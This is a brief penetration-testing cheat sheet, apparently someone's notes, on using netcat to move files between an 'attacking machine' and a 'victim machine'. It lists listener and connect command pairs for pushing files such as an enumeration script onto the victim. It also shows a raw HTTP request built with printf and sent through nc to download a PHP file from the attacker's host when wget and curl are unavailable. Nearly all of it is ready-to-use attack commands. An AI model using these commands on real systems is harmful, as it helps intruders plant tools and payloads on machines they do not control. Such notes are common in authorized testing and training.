Send a file on your machine to victim machine by listening for victim to connect outbound to you
On attacking machine:
nc -lvp 4444 < file

On victim machine:
nc 192.168.1.102 4444 > file

Send a file on your machine to victim machine by having victim listen for you to connect into
On attacking machine:
nc 192.168.1.103 3333 < enum.sh

On victim machine:
nc -lvp 3333 > enum.sh


NC web (for when wget / curl are not installed) (alternatively, just nc <lhost> <lport> > r.php)
printf "GET http://<LHOST>/r.txt HTTP/1.0\r\n\r\n" > get.txt
nc 192.168.1.128 80 < get.txt > r.php
